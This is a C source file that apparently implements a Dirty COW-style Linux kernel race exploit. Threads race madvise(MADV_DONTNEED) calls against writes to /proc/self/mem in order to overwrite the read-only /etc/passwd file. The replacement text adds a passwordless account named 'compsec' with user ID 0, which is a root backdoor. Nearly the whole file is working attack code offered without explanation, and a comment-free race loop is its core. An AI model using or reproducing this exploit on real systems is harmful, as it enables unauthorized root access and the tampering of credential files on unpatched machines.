#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

void* map_passwd;
void* map_dirty_wb;
int f1, f2;
struct stat st1, st2;

char etc_passwd[] = "/etc/passwd";

char passwd[] = "root:x:0:0:root:/root:/bin/bash\n \
compsec:x:0000:0:Compter Security,,,:/home/compsec:/bin/bash\n \
\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r";
 
void* madviseThread(void *arg)
{
  char *str = (char*)arg;
  int i,c=0;

  for(i=0;i<100000;i++) {
    c+=madvise(map_passwd,100,MADV_DONTNEED);
	c+=madvise(map_dirty_wb,100,MADV_DONTNEED);
  }
  //printf("madvise: Completed %d\n\n",c);
}
 
void* procselfmemThread(void *arg)
{
  char *str = (char*)arg;

  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;

  for(i=0;i<100000;i++) {
    lseek(f1,(uintptr_t) map_passwd,SEEK_SET);
    c+=write(f,str,strlen(str));
    lseek(f2,(uintptr_t) map_dirty_wb,SEEK_SET);
    c+=write(f,0,1);
  }

  //printf("/proc/self/mem: Completed %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
  pthread_t pth1,pth2;


  f1=open(etc_passwd,O_RDONLY);
  fstat(f1,&st1);

  f2=open("/proc/sys/vm/dirty_writeback_centisecs",O_RDONLY);
  fstat(f2,&st2);


  map_passwd = mmap(NULL,st1.st_size,PROT_READ,MAP_PRIVATE,f1,0);
  map_dirty_wb = mmap(NULL,st2.st_size,PROT_READ,MAP_PRIVATE,f2,0);



  pthread_create(&pth1,NULL,madviseThread, &etc_passwd);
  pthread_create(&pth2,NULL,procselfmemThread, &passwd);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);

  return 0;
}
